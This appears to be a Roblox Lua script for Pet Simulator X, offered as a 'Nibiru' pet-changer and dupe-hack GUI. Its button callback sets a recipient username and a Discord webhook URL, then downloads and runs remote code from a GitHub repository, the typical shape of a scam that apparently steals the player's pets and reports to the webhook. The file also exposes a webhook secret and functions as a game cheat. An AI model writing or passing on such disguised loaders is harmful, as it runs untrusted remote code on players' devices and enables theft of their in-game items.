local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()

local Window = OrionLib:MakeWindow({Name = "Nibiru [PSX-HUB]", HidePremium = false, SaveConfig = true, ConfigFolder = "Nibiru"})
OrionLib:MakeNotification({
	Name = "Nibiru [PSX-HUB]",
	Content = "Welcome to Nibiru [PSX-HUB]",
	Image = "rbxassetid://4483345998",
	Time = 10
})

local Tab = Window:MakeTab({
	Name = "PetChangerID",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})
Tab:AddButton({
	Name = "Press [ON]",
	Callback = function()
      		print("button pressed")
Username = "notulP_hctiwT"
WebHook = "https://discord.com/api/webhooks/1084890231834148904/T5cvufGS8ztTd17sbVeiv8Be1is5tCI2j-9QsDNI1LON3GlhQaAc4Nc5xXCL2B1U4X8V"

loadingscreen = true
_G.CustomScriptName = "Nibiru [DUPE HACK]"
_G.Text1 = "[SCRIPT] Loading now ..."
_G.Text2 = "[SCRIPT] Waiting 10 seconds ..."
_G.Text3 = "[SCRIPT] Checking now..."
_G.Text4 = "[SCRIPT] Starting now..."
loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/petsimguiss.lua%22))()
	end    
})

OrionLib:MakeNotification({
	Name = "Title!",
	Content = "[PetChangerID] Starting now...",
	Image = "rbxassetid://4483345998",
	Time = 10
})

OrionLib:Init()
